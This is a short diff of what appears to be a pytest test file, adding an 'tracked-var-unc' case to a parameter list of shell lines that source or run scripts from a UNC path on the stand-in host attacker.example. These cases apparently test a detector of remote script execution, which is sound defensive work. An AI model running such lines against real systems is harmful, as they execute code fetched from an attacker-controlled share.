@@ -136,6 +136,7 @@ UNC_SOURCE_LINES = [
     pytest.param("source //attacker.example/share/x.sh", id="source-prefixed"),
     pytest.param(". //attacker.example/share/x.sh", id="dot-command"),
     pytest.param("python3 //attacker.example/share/x.py", id="interpreter-invocation"),
+    pytest.param('UNC="//attacker.example/share"\nsource "$UNC/x.sh"', id="tracked-var-unc"),
 ]
 
 
